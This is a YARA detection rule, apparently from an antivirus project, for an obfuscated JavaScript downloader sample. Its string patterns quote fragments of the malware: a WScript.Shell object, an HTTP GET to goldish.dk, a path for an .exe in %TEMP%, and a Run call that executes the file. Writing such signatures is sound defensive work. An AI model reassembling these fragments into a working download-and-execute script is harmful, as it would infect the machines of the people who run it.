rule sig_20160330_3ca11409fc034893a930454a825f0cbb {
  meta:
    description = "datamaliciousorder - file 20160330_3ca11409fc034893a930454a825f0cbb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a55fc8a145c9f687c0310034414a5a5a3bf66d03272105ff56249ec345cc7ca8"

  strings:
    $s1  = "function _LW(_OM, _C){_MV = _MV * 1; return _OM - _C;};" fullword ascii
    $s2  = "_YJ[_WV](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s3  = "var _K = function _FU() {return WScript[_KB](\"WScript\"+\".Shell\");}(), _GX = 11;" fullword ascii
    $s4  = "if (_YJ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _ON() {return _K[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"QPeU9vgTfA.ex\" + \"e\";};" fullword ascii
    $s6  = "function _L(){return _Y + \"\";};" fullword ascii
    $s7  = "function _FV(_HX){_K[\"Run\"](_HX, _MV, _MV);};" fullword ascii
    $s8  = "function _OS() {return ((_W == true) && (_W == _E)) ? 1 : _MV;};" fullword ascii
    $s9  = " while (_J){" fullword ascii
    $s10 = "function _O(){return 22;};" fullword ascii
    $s11 = "var _J0 = new this[\"Date\"]();" fullword ascii
    $s12 = "function _LB(_Q) {var _KO = (1, 2, 3, 4, 5, _Q); return _KO;};" fullword ascii
    $s13 = "function _T(){return _KB;};" fullword ascii
    $s14 = "return _LW(_EW, _MD);" fullword ascii
    $s15 = "function _IL()" fullword ascii
    $s16 = "_W = true; " fullword ascii
    $s17 = "var _E = false;" fullword ascii
    $s18 = "_E = true; " fullword ascii
    $s19 = "} catch(_AR){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}